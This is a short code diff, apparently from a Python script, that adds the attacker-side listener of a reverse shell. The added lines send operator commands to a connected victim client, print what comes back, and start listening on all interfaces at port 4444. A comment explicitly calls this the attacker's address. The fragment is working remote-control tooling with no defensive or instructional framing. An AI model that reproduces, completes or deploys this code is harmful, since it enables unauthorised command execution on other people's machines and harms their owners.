@@ -22,4 +22,17 @@ def Server_Listening(ip, port):
         if command.lower() == 'exit':
             client_socket.send(b'exit')
             break
-            
+        
+        # Send the command to the client
+        client_socket.send(command.encode())
+
+        # Receive the result from the client
+        result = client_socket.recv(4096).decode()
+        print(result)   
+    
+   # Close the sockets
+    client_socket.close()
+    server_socket.close() 
+    
+# Usage: Replace with the attacker's IP address and chosen port
+Server_Listening('0.0.0.0', 4444)  # Listens on all interfaces on port 4444
